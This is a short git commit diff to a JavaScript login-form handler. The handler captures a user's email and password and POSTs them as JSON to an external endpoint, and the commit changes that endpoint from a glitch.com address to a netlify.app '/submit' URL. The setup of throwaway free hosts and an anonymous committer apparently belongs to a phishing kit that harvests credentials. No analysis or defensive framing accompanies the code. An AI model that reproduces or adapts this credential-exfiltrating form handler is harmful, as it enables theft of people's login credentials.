f21043815d0c21ae9693252f551ba4e16715f53b
uganda012 <tinozizir839@gmail.com>
2025-01-20 13:25:26 -0500

    Update form_handling_script.js

--- form_handling_script.js
+++ form_handling_script.js
@@ -5,7 +5,7 @@ document.getElementById("login-form").addEventListener("submit", function(e) {
     const password = document.getElementById("erf_password").value;
 
     // Отправка данных на сервер
-    fetch('https://glitch.com/edit/#!/living-historical-september', {  
+    fetch('https://gentle-tiramisu-1e25ce.netlify.app/submit', {  
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, password })  
